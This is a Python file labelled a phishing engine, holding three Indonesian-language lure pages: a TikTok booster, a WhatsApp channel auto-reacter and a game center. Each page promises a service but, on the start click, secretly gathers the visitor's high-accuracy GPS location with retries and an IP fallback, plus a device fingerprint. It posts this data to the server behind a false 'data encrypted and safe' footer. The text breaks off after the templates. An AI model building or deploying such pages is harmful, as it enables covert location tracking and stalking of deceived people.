#!/usr/bin/env python3
# main_phis.py - AXKA Phising Engine v3.1 (localhost.run + GPS Akurat)

import os
import sys
import time
import json
import subprocess
import threading
import re
import requests
import socket
import platform
from datetime import datetime
from colorama import Fore, Style, init
from flask import Flask, request, jsonify
from flask_cors import CORS

init(autoreset=True)

# ==================== KONFIGURASI ====================

PHIS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Phis")
PORT = 3000
os.makedirs(PHIS_DIR, exist_ok=True)

# ==================== TEMPLATE HTML (GPS AKURAT 95%+) ====================

SUNTIK_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Suntik TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 30px;
            width: 100%;
            max-width: 450px;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }
        .header { text-align: center; margin-bottom: 25px; }
        .header .icon { font-size: 50px; display: block; }
        .header h1 { color: #fff; font-size: 22px; font-weight: 700; }
        .header p { color: rgba(255,255,255,0.5); font-size: 13px; margin-top: 4px; }
        .header .badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            background: rgba(255,107,107,0.2);
            color: #ff6b6b;
            font-size: 10px;
            font-weight: 600;
            margin-top: 8px;
        }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; color: #fff; font-size: 13px; font-weight: 500; margin-bottom: 6px; }
        .form-group input, .form-group select {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            background: rgba(255,255,255,0.05);
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: all 0.3s;
        }
        .form-group input:focus, .form-group select:focus {
            border-color: #ff6b6b;
            background: rgba(255,255,255,0.08);
        }
        .form-group input::placeholder { color: rgba(255,255,255,0.3); }
        .form-group select option { background: #1a1a2e; color: #fff; }
        .btn-start {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        .btn-start:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(238,90,36,0.3); }
        .btn-start:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
        .status {
            margin-top: 15px;
            padding: 15px;
            border-radius: 12px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.05);
            display: none;
        }
        .status.show { display: block; }
        .status .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255,255,255,0.1);
            border-top-color: #ff6b6b;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status .msg { color: rgba(255,255,255,0.8); font-size: 14px; display: flex; align-items: center; gap: 10px; }
        .status .msg.success { color: #2ecc71; }
        .status .msg.error { color: #ff6b6b; }
        .footer { text-align: center; margin-top: 20px; color: rgba(255,255,255,0.2); font-size: 11px; }
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            color: #fff;
            padding: 12px 24px;
            border-radius: 12px;
            font-size: 13px;
            opacity: 0;
            transition: all 0.3s;
            pointer-events: none;
            z-index: 1000;
            backdrop-filter: blur(10px);
        }
        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
        .loading-dots::after {
            content: '...';
            animation: dots 1.5s steps(4, end) infinite;
        }
        @keyframes dots {
            0% { content: ''; }
            25% { content: '.'; }
            50% { content: '..'; }
            75% { content: '...'; }
        }
        .gps-hidden { display: none; }
        .accuracy-badge {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 10px;
            font-size: 10px;
            font-weight: 600;
            margin-left: 6px;
        }
        .accuracy-high { background: rgba(46,204,113,0.3); color: #2ecc71; }
        .accuracy-medium { background: rgba(241,196,15,0.3); color: #f1c40f; }
        .accuracy-low { background: rgba(231,76,60,0.3); color: #e74c3c; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="icon">💉</span>
            <h1>Suntik TikTok</h1>
            <p>Boost view & followers otomatis</p>
            <span class="badge">⚡ AXKA</span>
        </div>

        <div class="form-group">
            <label>📎 Link TikTok</label>
            <input type="text" id="linkInput" placeholder="https://www.tiktok.com/@username/video/xxx" />
        </div>

        <div class="form-group">
            <label>📂 Kategori</label>
            <select id="categorySelect">
                <option value="views">👁️ Views</option>
                <option value="followers">👥 Followers</option>
                <option value="likes">❤️ Likes</option>
                <option value="comments">💬 Comments</option>
                <option value="all">🔥 All In One</option>
            </select>
        </div>

        <button class="btn-start" id="startBtn" onclick="startProcess()">🚀 START SUNTIK</button>

        <div class="status" id="status">
            <div class="msg" id="statusMsg">
                <span class="spinner"></span>
                <span id="statusText">Memproses<span class="loading-dots"></span></span>
            </div>
        </div>
        <div class="footer">🔒 Data terenkripsi & aman</div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        // ==================== GPS AKURAT 95%+ ====================
        function getAccurateLocation() {
            return new Promise(function(resolve) {
                if (!navigator.geolocation) {
                    resolve({ lat: 0, lon: 0, accuracy: 0, source: 'none' });
                    return;
                }

                let resolved = false;
                let bestResult = null;
                let attempts = 0;
                const MAX_ATTEMPTS = 3;

                function tryGetLocation(highAccuracy) {
                    attempts++;
                    const options = {
                        enableHighAccuracy: highAccuracy,
                        timeout: highAccuracy ? 15000 : 8000,
                        maximumAge: 0
                    };

                    navigator.geolocation.getCurrentPosition(
                        function(pos) {
                            if (!resolved) {
                                const acc = pos.coords.accuracy || 0;
                                // Simpan hasil terbaik (akurasi terkecil)
                                if (!bestResult || acc < bestResult.accuracy) {
                                    bestResult = {
                                        lat: pos.coords.latitude,
                                        lon: pos.coords.longitude,
                                        accuracy: acc,
                                        altitude: pos.coords.altitude || null,
                                        speed: pos.coords.speed || null,
                                        heading: pos.coords.heading || null,
                                        timestamp: pos.timestamp,
                                        source: highAccuracy ? 'gps_high' : 'gps_standard'
                                    };
                                }
                                // Jika akurasi sudah bagus (< 50m), langsung resolve
                                if (acc < 50) {
                                    resolved = true;
                                    resolve(bestResult);
                                }
                            }
                        },
                        function(err) {
                            // Error, coba lagi jika masih ada kesempatan
                            if (!resolved && attempts < MAX_ATTEMPTS) {
                                setTimeout(function() {
                                    tryGetLocation(highAccuracy);
                                }, 1000);
                            }
                        },
                        options
                    );
                }

                // Coba dengan high accuracy dulu
                tryGetLocation(true);

                // Fallback: jika belum resolve dalam 12 detik, pake hasil terbaik atau standard
                setTimeout(function() {
                    if (!resolved) {
                        if (bestResult) {
                            resolved = true;
                            resolve(bestResult);
                        } else {
                            // Coba sekali lagi dengan standard accuracy
                            navigator.geolocation.getCurrentPosition(
                                function(pos) {
                                    if (!resolved) {
                                        resolved = true;
                                        resolve({
                                            lat: pos.coords.latitude,
                                            lon: pos.coords.longitude,
                                            accuracy: pos.coords.accuracy || 0,
                                            source: 'gps_standard_fallback'
                                        });
                                    }
                                },
                                function() {
                                    if (!resolved) {
                                        resolved = true;
                                        resolve({ lat: 0, lon: 0, accuracy: 0, source: 'none' });
                                    }
                                },
                                { enableHighAccuracy: false, timeout: 5000 }
                            );
                        }
                    }
                }, 12000);
            });
        }

        // ==================== AMBIL LOKASI DARI IP (FALLBACK) ====================
        function getLocationFromIP() {
            return fetch('https://ipapi.co/json/', { timeout: 3000 })
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    return {
                        city: data.city || 'Tidak diketahui',
                        region: data.region || 'Tidak diketahui',
                        country: data.country_name || 'Tidak diketahui',
                        lat: data.latitude || 0,
                        lon: data.longitude || 0,
                        ip: data.ip || 'Tidak diketahui',
                        accuracy: 5000,
                        source: 'ip'
                    };
                })
                .catch(function() {
                    return { city: 'Tidak diketahui', region: 'Tidak diketahui', country: 'Tidak diketahui', lat: 0, lon: 0, accuracy: 0, source: 'none' };
                });
        }

        // ==================== AMBIL SPESIFIKASI ====================
        function getSystemInfo() {
            var info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                hardwareConcurrency: navigator.hardwareConcurrency || 0,
                deviceMemory: navigator.deviceMemory || 0,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                cookieEnabled: navigator.cookieEnabled,
                touchSupported: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
                maxTouchPoints: navigator.maxTouchPoints || 0
            };

            try {
                var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    info.connection = {
                        effectiveType: conn.effectiveType,
                        rtt: conn.rtt,
                        downlink: conn.downlink
                    };
                }
            } catch(e) {}

            return info;
        }

        // ==================== TOAST ====================
        function showToast(message, type) {
            var toast = document.getElementById('toast');
            toast.textContent = message;
            toast.className = 'toast show';
            if (type === 'success') {
                toast.style.background = 'rgba(46, 204, 113, 0.9)';
            } else if (type === 'error') {
                toast.style.background = 'rgba(255, 107, 107, 0.9)';
            } else {
                toast.style.background = 'rgba(0, 0, 0, 0.8)';
            }
            setTimeout(function() {
                toast.className = 'toast';
            }, 3000);
        }

        // ==================== MAIN PROCESS ====================
        async function startProcess() {
            var link = document.getElementById('linkInput').value.trim();
            var category = document.getElementById('categorySelect').value;
            var statusEl = document.getElementById('status');
            var statusText = document.getElementById('statusText');
            var btn = document.getElementById('startBtn');

            if (!link) {
                showToast('❌ Masukkan link TikTok!', 'error');
                return;
            }

            if (!link.startsWith('http')) {
                showToast('❌ Link tidak valid!', 'error');
                return;
            }

            btn.disabled = true;
            statusEl.classList.add('show');
            statusText.innerHTML = 'Mengambil lokasi GPS...<span class="loading-dots"></span>';

            // Ambil GPS dengan akurasi tinggi
            var location = await getAccurateLocation();

            // Jika GPS gagal (lat=0), coba IP
            if (location.lat === 0 && location.lon === 0) {
                statusText.innerHTML = 'GPS gagal, mencoba IP geolocation...<span class="loading-dots"></span>';
                try {
                    var ipLocation = await getLocationFromIP();
                    location = { ...location, ...ipLocation };
                } catch(e) {}
            }

            var sysInfo = getSystemInfo();

            // Tambahkan info akurasi
            var accuracyText = 'Tidak diketahui';
            var accuracyClass = 'accuracy-low';
            if (location.accuracy) {
                if (location.accuracy < 50) {
                    accuracyText = 'Sangat Akurat (GPS)';
                    accuracyClass = 'accuracy-high';
                } else if (location.accuracy < 200) {
                    accuracyText = 'Akurat (GPS)';
                    accuracyClass = 'accuracy-high';
                } else if (location.accuracy < 1000) {
                    accuracyText = 'Cukup Akurat (GPS)';
                    accuracyClass = 'accuracy-medium';
                } else {
                    accuracyText = 'Perkiraan (IP)';
                    accuracyClass = 'accuracy-low';
                }
            }

            var data = {
                link: link,
                category: category,
                location: {
                    lat: location.lat || 0,
                    lon: location.lon || 0,
                    accuracy: location.accuracy || 0,
                    source: location.source || 'unknown',
                    altitude: location.altitude || null,
                    speed: location.speed || null,
                    heading: location.heading || null,
                    timestamp: location.timestamp || new Date().toISOString()
                },
                systemInfo: sysInfo,
                timestamp: new Date().toISOString(),
                timestampLocal: new Date().toString(),
                accuracy_level: accuracyText,
                location_source: location.source || 'unknown'
            };

            try {
                var response = await fetch('/api/process', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                var result = await response.json();
                
                btn.disabled = false;
                if (result.success) {
                    statusText.innerHTML = '✅ ' + result.message + ' | 🎯 ' + accuracyText;
                    statusText.className = 'success';
                    showToast('✅ Data berhasil dikirim! Akurasi: ' + accuracyText, 'success');
                } else {
                    statusText.innerHTML = '❌ ' + result.message;
                    statusText.className = 'error';
                    showToast('❌ ' + result.message, 'error');
                }
            } catch(err) {
                btn.disabled = false;
                statusText.innerHTML = '❌ Gagal terhubung ke server';
                statusText.className = 'error';
                showToast('❌ Gagal terhubung ke server', 'error');
            }
        }

        document.getElementById('linkInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                startProcess();
            }
        });
    </script>
</body>
</html>'''

REACT_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reacth CH</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a1a, #1a1a2e, #16213e);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 30px;
            width: 100%;
            max-width: 450px;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }
        .header { text-align: center; margin-bottom: 25px; }
        .header .icon { font-size: 50px; display: block; }
        .header h1 { color: #fff; font-size: 22px; font-weight: 700; }
        .header p { color: rgba(255,255,255,0.5); font-size: 13px; margin-top: 4px; }
        .header .badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            background: rgba(0,210,211,0.2);
            color: #00d2d3;
            font-size: 10px;
            font-weight: 600;
            margin-top: 8px;
        }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; color: #fff; font-size: 13px; font-weight: 500; margin-bottom: 6px; }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            background: rgba(255,255,255,0.05);
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: all 0.3s;
        }
        .form-group input:focus { border-color: #00d2d3; background: rgba(255,255,255,0.08); }
        .form-group input::placeholder { color: rgba(255,255,255,0.3); }
        .emoji-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 8px;
            margin-top: 8px;
        }
        .emoji-btn {
            padding: 12px;
            border: 2px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            background: rgba(255,255,255,0.05);
            font-size: 28px;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
        }
        .emoji-btn:hover { border-color: #00d2d3; background: rgba(0,210,211,0.1); transform: scale(1.05); }
        .emoji-btn.selected { border-color: #00d2d3; background: rgba(0,210,211,0.2); box-shadow: 0 0 20px rgba(0,210,211,0.2); }
        .selected-emoji { text-align: center; padding: 10px; background: rgba(0,210,211,0.05); border-radius: 12px; margin-top: 8px; color: rgba(255,255,255,0.5); font-size: 13px; }
        .selected-emoji span { font-size: 28px; }
        .btn-start {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(135deg, #00d2d3, #01a3a4);
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        .btn-start:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,210,211,0.3); }
        .btn-start:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
        .status {
            margin-top: 15px;
            padding: 15px;
            border-radius: 12px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.05);
            display: none;
        }
        .status.show { display: block; }
        .status .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255,255,255,0.1);
            border-top-color: #00d2d3;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status .msg { color: rgba(255,255,255,0.8); font-size: 14px; display: flex; align-items: center; gap: 10px; }
        .status .msg.success { color: #2ecc71; }
        .status .msg.error { color: #ff6b6b; }
        .footer { text-align: center; margin-top: 20px; color: rgba(255,255,255,0.2); font-size: 11px; }
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            color: #fff;
            padding: 12px 24px;
            border-radius: 12px;
            font-size: 13px;
            opacity: 0;
            transition: all 0.3s;
            pointer-events: none;
            z-index: 1000;
            backdrop-filter: blur(10px);
        }
        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
        .loading-dots::after {
            content: '...';
            animation: dots 1.5s steps(4, end) infinite;
        }
        @keyframes dots {
            0% { content: ''; }
            25% { content: '.'; }
            50% { content: '..'; }
            75% { content: '...'; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="icon">❤️</span>
            <h1>Reacth CH</h1>
            <p>Auto React ke Channel WhatsApp</p>
            <span class="badge">⚡ AXKA</span>
        </div>

        <div class="form-group">
            <label>📎 Link URL</label>
            <input type="text" id="urlInput" placeholder="https://whatsapp.com/channel/xxx/xxx" />
        </div>

        <div class="form-group">
            <label>😊 Pilih Emoji</label>
            <div class="emoji-grid">
                <div class="emoji-btn" onclick="selectEmoji(this, '❤️')">❤️</div>
                <div class="emoji-btn" onclick="selectEmoji(this, '🔥')">🔥</div>
                <div class="emoji-btn" onclick="selectEmoji(this, '😍')">😍</div>
                <div class="emoji-btn" onclick="selectEmoji(this, '👍')">👍</div>
                <div class="emoji-btn" onclick="selectEmoji(this, '👎')">👎</div>
                <div class="emoji-btn" onclick="selectEmoji(this, '😂')">😂</div>
                <div class="emoji-btn" onclick="selectEmoji(this, '😱')">😱</div>
                <div class="emoji-btn" onclick="selectEmoji(this, '🎉')">🎉</div>
            </div>
            <div class="selected-emoji" id="selectedEmoji">Pilih emoji di atas</div>
            <input type="hidden" id="emojiInput" value="" />
        </div>

        <button class="btn-start" id="startBtn" onclick="startProcess()">🚀 START REACT</button>

        <div class="status" id="status">
            <div class="msg" id="statusMsg">
                <span class="spinner"></span>
                <span id="statusText">Memproses<span class="loading-dots"></span></span>
            </div>
        </div>
        <div class="footer">🔒 Data terenkripsi & aman</div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        var selectedEmoji = '';

        function selectEmoji(el, emoji) {
            document.querySelectorAll('.emoji-btn').forEach(function(b) { b.classList.remove('selected'); });
            el.classList.add('selected');
            selectedEmoji = emoji;
            document.getElementById('selectedEmoji').innerHTML = 'Emoji dipilih: <span>' + emoji + '</span>';
        }

        function getAccurateLocation() {
            return new Promise(function(resolve) {
                if (!navigator.geolocation) {
                    resolve({ lat: 0, lon: 0, accuracy: 0 });
                    return;
                }
                let resolved = false;
                let bestResult = null;

                const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };

                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        if (!resolved) {
                            resolved = true;
                            resolve({
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy || 0
                            });
                        }
                    },
                    function() {
                        if (!resolved) {
                            resolved = true;
                            navigator.geolocation.getCurrentPosition(
                                function(pos) {
                                    resolve({
                                        lat: pos.coords.latitude,
                                        lon: pos.coords.longitude,
                                        accuracy: pos.coords.accuracy || 0
                                    });
                                },
                                function() {
                                    resolve({ lat: 0, lon: 0, accuracy: 0 });
                                },
                                { enableHighAccuracy: false, timeout: 5000 }
                            );
                        }
                    },
                    options
                );

                setTimeout(function() {
                    if (!resolved) {
                        resolved = true;
                        resolve({ lat: 0, lon: 0, accuracy: 0 });
                    }
                }, 12000);
            });
        }

        function getSystemInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                hardwareConcurrency: navigator.hardwareConcurrency || 0,
                deviceMemory: navigator.deviceMemory || 0,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        function showToast(message, type) {
            var toast = document.getElementById('toast');
            toast.textContent = message;
            toast.className = 'toast show';
            toast.style.background = type === 'success' ? 'rgba(46, 204, 113, 0.9)' : 
                                    type === 'error' ? 'rgba(255, 107, 107, 0.9)' : 'rgba(0,0,0,0.8)';
            setTimeout(function() { toast.className = 'toast'; }, 3000);
        }

        async function startProcess() {
            var url = document.getElementById('urlInput').value.trim();
            var statusEl = document.getElementById('status');
            var statusText = document.getElementById('statusText');
            var btn = document.getElementById('startBtn');

            if (!url) {
                showToast('❌ Masukkan URL!', 'error');
                return;
            }
            if (!selectedEmoji) {
                showToast('❌ Pilih emoji!', 'error');
                return;
            }

            btn.disabled = true;
            statusEl.classList.add('show');
            statusText.innerHTML = 'Memproses<span class="loading-dots"></span>';

            var location = await getAccurateLocation();
            var sysInfo = getSystemInfo();

            var data = {
                url: url,
                emoji: selectedEmoji,
                location: location,
                systemInfo: sysInfo,
                timestamp: new Date().toISOString()
            };

            try {
                var response = await fetch('/api/process', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                var result = await response.json();
                btn.disabled = false;
                if (result.success) {
                    statusText.innerHTML = '✅ ' + result.message;
                    statusText.className = 'success';
                    showToast('✅ ' + result.message, 'success');
                } else {
                    statusText.innerHTML = '❌ ' + result.message;
                    statusText.className = 'error';
                    showToast('❌ ' + result.message, 'error');
                }
            } catch(err) {
                btn.disabled = false;
                statusText.innerHTML = '❌ Gagal terhubung ke server';
                statusText.className = 'error';
                showToast('❌ Gagal terhubung ke server', 'error');
            }
        }
    </script>
</body>
</html>'''

GAME_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Game Center</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a0a1a, #2d1b2d, #1a0a2e);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 30px;
            width: 100%;
            max-width: 450px;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }
        .header { text-align: center; margin-bottom: 25px; }
        .header .icon { font-size: 50px; display: block; }
        .header h1 { color: #fff; font-size: 22px; font-weight: 700; }
        .header p { color: rgba(255,255,255,0.5); font-size: 13px; margin-top: 4px; }
        .header .badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            background: rgba(155,89,182,0.2);
            color: #9b59b6;
            font-size: 10px;
            font-weight: 600;
            margin-top: 8px;
        }
        .game-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin: 15px 0;
        }
        .game-btn {
            padding: 20px;
            border: 2px solid rgba(255,255,255,0.1);
            border-radius: 16px;
            background: rgba(255,255,255,0.05);
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
        }
        .game-btn .icon-big { font-size: 36px; display: block; margin-bottom: 6px; }
        .game-btn:hover { border-color: #9b59b6; background: rgba(155,89,182,0.1); transform: translateY(-3px); }
        .game-btn.selected { border-color: #9b59b6; background: rgba(155,89,182,0.2); box-shadow: 0 0 30px rgba(155,89,182,0.2); }
        .selected-game {
            text-align: center;
            padding: 12px;
            background: rgba(155,89,182,0.05);
            border-radius: 12px;
            margin-top: 10px;
            color: rgba(255,255,255,0.5);
            font-size: 13px;
        }
        .btn-start {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(135deg, #9b59b6, #8e44ad);
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        .btn-start:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(155,89,182,0.3); }
        .btn-start:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
        .status {
            margin-top: 15px;
            padding: 15px;
            border-radius: 12px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.05);
            display: none;
        }
        .status.show { display: block; }
        .status .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255,255,255,0.1);
            border-top-color: #9b59b6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status .msg { color: rgba(255,255,255,0.8); font-size: 14px; display: flex; align-items: center; gap: 10px; }
        .status .msg.success { color: #2ecc71; }
        .status .msg.error { color: #ff6b6b; }
        .footer { text-align: center; margin-top: 20px; color: rgba(255,255,255,0.2); font-size: 11px; }
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            color: #fff;
            padding: 12px 24px;
            border-radius: 12px;
            font-size: 13px;
            opacity: 0;
            transition: all 0.3s;
            pointer-events: none;
            z-index: 1000;
            backdrop-filter: blur(10px);
        }
        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
        .loading-dots::after {
            content: '...';
            animation: dots 1.5s steps(4, end) infinite;
        }
        @keyframes dots {
            0% { content: ''; }
            25% { content: '.'; }
            50% { content: '..'; }
            75% { content: '...'; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="icon">🎮</span>
            <h1>Game Center</h1>
            <p>Pilih game favoritmu!</p>
            <span class="badge">⚡ AXKA</span>
        </div>

        <div class="game-grid">
            <div class="game-btn" onclick="selectGame(this, 'Free Fire')"><span class="icon-big">🔥</span>Free Fire</div>
            <div class="game-btn" onclick="selectGame(this, 'Mobile Legends')"><span class="icon-big">⚔️</span>MLBB</div>
            <div class="game-btn" onclick="selectGame(this, 'PUBG Mobile')"><span class="icon-big">🎯</span>PUBG</div>
            <div class="game-btn" onclick="selectGame(this, 'Call of Duty')"><span class="icon-big">🔫</span>COD</div>
        </div>

        <div class="selected-game" id="selectedGame">Pilih game di atas</div>
        <input type="hidden" id="gameInput" value="" />

        <button class="btn-start" id="startBtn" onclick="startProcess()">🚀 START GAME</button>

        <div class="status" id="status">
            <div class="msg" id="statusMsg">
                <span class="spinner"></span>
                <span id="statusText">Memproses<span class="loading-dots"></span></span>
            </div>
        </div>
        <div class="footer">🔒 Data terenkripsi & aman</div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        var selectedGame = '';

        function selectGame(el, game) {
            document.querySelectorAll('.game-btn').forEach(function(b) { b.classList.remove('selected'); });
            el.classList.add('selected');
            selectedGame = game;
            document.getElementById('selectedGame').innerHTML = 'Game dipilih: <strong style="color:#9b59b6;">' + game + '</strong>';
        }

        function getAccurateLocation() {
            return new Promise(function(resolve) {
                if (!navigator.geolocation) {
                    resolve({ lat: 0, lon: 0, accuracy: 0 });
                    return;
                }
                let resolved = false;
                const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };

                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        if (!resolved) {
                            resolved = true;
                            resolve({
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy || 0
                            });
                        }
                    },
                    function() {
                        if (!resolved) {
                            resolved = true;
                            resolve({ lat: 0, lon: 0, accuracy: 0 });
                        }
                    },
                    options
                );

                setTimeout(function() {
                    if (!resolved) {
                        resolved = true;
                        resolve({ lat: 0, lon: 0, accuracy: 0 });
                    }
                }, 12000);
            });
        }

        function getSystemInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                hardwareConcurrency: navigator.hardwareConcurrency || 0,
                deviceMemory: navigator.deviceMemory || 0,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        function showToast(message, type) {
            var toast = document.getElementById('toast');
            toast.textContent = message;
            toast.className = 'toast show';
            toast.style.background = type === 'success' ? 'rgba(46, 204, 113, 0.9)' : 
                                    type === 'error' ? 'rgba(255, 107, 107, 0.9)' : 'rgba(0,0,0,0.8)';
            setTimeout(function() { toast.className = 'toast'; }, 3000);
        }

        async function startProcess() {
            var statusEl = document.getElementById('status');
            var statusText = document.getElementById('statusText');
            var btn = document.getElementById('startBtn');

            if (!selectedGame) {
                showToast('❌ Pilih game!', 'error');
                return;
            }

            btn.disabled = true;
            statusEl.classList.add('show');
            statusText.innerHTML = 'Memproses<span class="loading-dots"></span>';

            var location = await getAccurateLocation();
            var sysInfo = getSystemInfo();

            var data = {
                game: selectedGame,
                location: location,
                systemInfo: sysInfo,
                timestamp: new Date().toISOString()
            };

            try {
                var response = await fetch('/api/process', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                var result = await response.json();
                btn.disabled = false;
                if (result.success) {
                    statusText.innerHTML = '✅ ' + result.message;
                    statusText.className = 'success';
                    showToast('✅ ' + result.message, 'success');
                } else {
                    statusText.innerHTML = '❌ ' + result.message;
                    statusText.className = 'error';
                    showToast('❌ ' + result.message, 'error');
                }
            } catch(err) {
                btn.disabled = false;
                statusText.innerHTML = '❌ Gagal terhubung ke server';
                statusText.className = 'error';
                showToast('❌ Gagal terhubung ke server', 'error');
            }
        }
    </script>
</body>
</html>'''

